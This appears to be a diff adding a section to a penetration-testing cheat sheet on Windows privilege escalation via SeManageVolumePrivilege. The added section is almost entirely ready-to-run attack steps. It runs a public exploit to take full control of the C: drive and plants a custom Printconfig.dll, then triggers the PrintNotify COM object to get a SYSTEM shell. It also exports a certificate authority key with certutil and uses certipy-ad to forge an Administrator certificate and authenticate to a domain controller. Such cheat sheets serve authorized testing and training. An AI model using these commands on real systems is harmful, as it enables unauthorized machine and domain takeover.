@@ -6210,6 +6210,53 @@ sc.exe stop VSS
 sc.exe start VSS
 ```
 
+###### SeManageVolumePrivilege
+
+> https://github.com/CsEnox/SeManageVolumeExploit
+
+###### Grant full Permission on C:\ Drive
+
+```cmd
+.\SeManageVolumeExploit
+```
+
+###### Overwriting "Printconfig.dll" for SYSTEM Shell Access
+
+1. Generate a custom DLL and locate it at `C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll`.
+2. Initiate the `PrintNotify` object by executing the following PowerShell commands:
+
+```cmd
+$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
+```
+
+```cmd
+$object = [Activator]::CreateInstance($type)
+```
+
+3. Attain a system shell access.
+
+###### Golden Ticket
+
+```cmd
+.\SeManageVolumeExploit 
+```
+
+```cmd
+certutil -store My
+```
+
+```cmd
+certutil -exportPFX My 75b2f4bbd71f108945247b466161bdph <FILE>.pfx
+```
+
+```console
+certipy-ad forge -ca-pfx '<FILE>.pfx' -upn 'Administrator@<DOMAIN>' -subject 'CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>'
+```
+
+```console
+certipy-ad auth -pfx administrator_forged.pfx -dc-ip <RHOST>
+```
+
 ###### SeTakeOwnershipPrivilege
 
 ```cmd
